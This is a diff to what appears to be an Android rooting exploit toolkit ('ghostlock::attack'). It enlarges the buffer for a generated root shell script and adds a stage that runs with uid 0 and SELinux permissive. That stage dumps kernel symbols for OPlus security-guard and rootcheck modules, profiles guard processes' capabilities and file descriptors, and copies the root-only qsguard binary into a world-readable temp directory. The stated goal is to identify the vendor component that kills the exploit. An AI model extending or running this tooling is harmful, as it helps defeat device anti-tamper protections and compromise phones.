@@ -272,9 +272,12 @@ namespace ghostlock::attack {
     }
 
     void write_root_script(void) {
-        /* The SELinux enforce-write block adds ~2.5 KiB; 20 KiB keeps the
-         * script well clear of the truncation guard below. */
-        std::string script(20480, '\0');
+        /* Measured 2026-11-15: the generated script is 18.2 KiB at HEAD and
+         * 20.2 KiB with the guard probe, against the previous 20 KiB buffer --
+         * 300 bytes of headroom is not a margin. 32 KiB restores it; the
+         * truncation guard below still fails the run rather than writing a
+         * half script. */
+        std::string script(32768, '\0');
         support::UniqueFd sfd(
             open((config::runtime_config_snapshot().root_script_path.c_str()), O_WRONLY | O_CREAT | O_TRUNC, 0755));
         if (!sfd.valid()) {
@@ -571,6 +574,53 @@ namespace ghostlock::attack {
             "  echo \"[*] vr.ko selinux block: post node=$(stat -c '%%F' /proc/vrp 2>/dev/null) enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null) vrp=${post:-none}\" >>\"$LOG\"\n"
             "  return 0\n"
             "}\n"
+            /* OPlus guard probe (2026-11-15). The gate doc records the kill but
+             * not the actor. qsguard (/system_ext/bin/qsguard, uid 1000) runs
+             * with capabilities KILL and group readproc, burns no CPU and is
+             * event-driven -- the prime suspect for the process-level kill. Its
+             * binary, its fds and its inputs are root-only, so this stage copies
+             * them out while the shell still has uid 0 and SELinux is
+             * permissive. Read-only: it starts nothing, signals nothing and
+             * changes no state. */
+            "guard_probe() {\n"
+            "  gp_dir=/data/local/tmp/ghostlock-guard-$$\n"
+            "  mkdir -p \"$gp_dir\" 2>/dev/null\n"
+            "  echo 'GUARD-PROBE-BEGIN'\n"
+            "  echo \"[*] guard probe: dir=$gp_dir ctx=$(cat /proc/self/attr/current 2>/dev/null)\" >>\"$LOG\"\n"
+            "  { echo \"kernel=$(uname -r) uid=$(id -u) enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null)\";\n"
+            "    echo '--- modules ---';\n"
+            "    grep -E '^oplus_(security_guard|secure_harden|security_keventupload)[[:space:]]' /proc/modules 2>/dev/null;\n"
+            "    echo '--- kallsyms guard symbols ---';\n"
+            "    grep -cE '\\[oplus_(security_guard|secure_harden)\\]' /proc/kallsyms 2>/dev/null;\n"
+            "    grep -E '\\[oplus_(security_guard|secure_harden)\\]$' /proc/kallsyms 2>/dev/null | head -n 40;\n"
+            "    echo '--- kallsyms rootcheck ---';\n"
+            "    grep -iE 'rootcheck|oem_exec_gate' /proc/kallsyms 2>/dev/null | head -n 20;\n"
+            "  } >\"$gp_dir/kallsyms.txt\" 2>&1\n"
+            "  for gp_p in /proc/[0-9]*; do\n"
+            "    gp_pid=${gp_p#/proc/}\n"
+            "    gp_nm=$(cat \"$gp_p/comm\" 2>/dev/null) || continue\n"
+            "    case \"$gp_nm\" in\n"
+            "      qsguard|*securityguard*|*phonemanager*)\n"
+            "        { echo \"pid=$gp_pid comm=$gp_nm owner=$(stat -c %%u $gp_p 2>/dev/null) ctx=$(cat $gp_p/attr/current 2>/dev/null)\";\n"
+            "          echo \"  cmd=$(tr '\\0' ' ' < $gp_p/cmdline 2>/dev/null | cut -c1-160)\";\n"
+            "          grep -E '^(CapEff|CapPrm|Threads|SigCgt)' $gp_p/status 2>/dev/null;\n"
+            "          echo '  fds:';\n"
+            "          ls -l $gp_p/fd 2>/dev/null | tail -n +2 | head -n 25;\n"
+            "        } >>\"$gp_dir/procs.txt\" 2>&1 ;;\n"
+            "    esac\n"
+            "  done\n"
+            "  cp /system_ext/bin/qsguard \"$gp_dir/qsguard.bin\" 2>/dev/null\n"
+            "  cp /system_ext/etc/init/qsguard.rc \"$gp_dir/qsguard.rc\" 2>/dev/null\n"
+            "  pm path com.coloros.securityguard >\"$gp_dir/pkg.txt\" 2>&1\n"
+            "  pm path com.coloros.phonemanager >>\"$gp_dir/pkg.txt\" 2>&1\n"
+            "  chmod 755 \"$gp_dir\" 2>/dev/null\n"
+            "  chmod 644 \"$gp_dir\"/* 2>/dev/null\n"
+            "  echo \"[*] guard probe: artifacts=$(ls \"$gp_dir\" 2>/dev/null | tr '\\n' ' ') qsguard=$( [ -f \"$gp_dir/qsguard.bin\" ] && wc -c <\"$gp_dir/qsguard.bin\" 2>/dev/null || echo 0 ) bytes\" >>\"$LOG\"\n"
+            "  echo \"GUARD-PROBE-DIR $gp_dir\"\n"
+            "  echo 'GUARD-PROBE-END'\n"
+            "  return 0\n"
+            "}\n"
+            "guard_probe\n"
             "vrko_selinux_block\n"
             /* the rename is atomic, so a failed read leaves the old dump in place */
             "echo \"# $(uname -r)\" >\"$HOME_DIR/.ghostlock_iomem.new\"\n"
